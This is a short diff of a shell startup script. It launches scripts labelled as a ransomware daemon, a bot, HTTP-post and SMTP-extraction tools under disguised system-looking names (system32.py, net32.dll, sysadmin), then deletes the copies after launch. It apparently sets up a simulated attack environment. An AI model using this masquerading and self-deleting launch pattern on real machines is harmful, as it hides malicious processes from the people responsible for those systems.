@@ -4,7 +4,8 @@ mv /usr/bin/bot_ping.py /usr/bin/system_.exe
 python2 system_.exe &
 
 # start ransomware daemon
-python2 system32.py &
+cp ransom_server.py /sbin/system32.py
+python2 /sbin/system32.py &
 
 # start nmap user
 getty -a fred_1 tty15 &
@@ -19,11 +20,13 @@ rm /home/allan_1/allan_1.py
 # http post
 cp http_post_user.py /sbin/sysadmin
 python2 /sbin/sysadmin &
+sleep 5
 rm /sbin/sysadmin
 
 # smtp
 cp smtp_extract.py /bin/net32.dll
 python2 /bin/net32.dll &
+sleep 5
 rm /bin/net32.dll
 
 # apache webhook from Rumnex
